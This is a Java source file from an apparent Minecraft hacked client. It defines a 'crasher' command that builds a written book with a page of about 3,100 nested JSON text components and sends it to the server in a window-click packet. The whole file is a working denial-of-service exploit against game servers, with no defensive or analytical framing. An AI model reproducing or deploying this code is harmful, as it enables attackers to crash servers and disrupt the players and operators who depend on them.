package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C0EPacketClickWindow;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;

public class CustomPayloadFixerCrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void execute(int packets) {
        ItemStack writtenBook = new ItemStack(Items.written_book);
        NBTTagCompound comp = new NBTTagCompound();
        NBTTagList list = new NBTTagList();
        String repeatedPart = repeatString("extra:[{text:L}],", 3100);
        StringBuilder content = new StringBuilder();
        content.append("{").append(repeatedPart).append("text:L}");
        list.appendTag(new NBTTagString(content.toString()));

        comp.setString("author", "SmogClient");
        comp.setString("title", "BOOK");
        comp.setByte("resolved", (byte) 1);
        comp.setTag("pages", list);

        writtenBook.setTagCompound(comp);

        mc.getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 0, 1, 2, writtenBook, (short) 0));
    }

    private String repeatString(String str, int times) {
        StringBuilder repeated = new StringBuilder();
        for (int i = 0; i < times; i++) {
            repeated.append(str);
        }
        return repeated.toString();
    }
}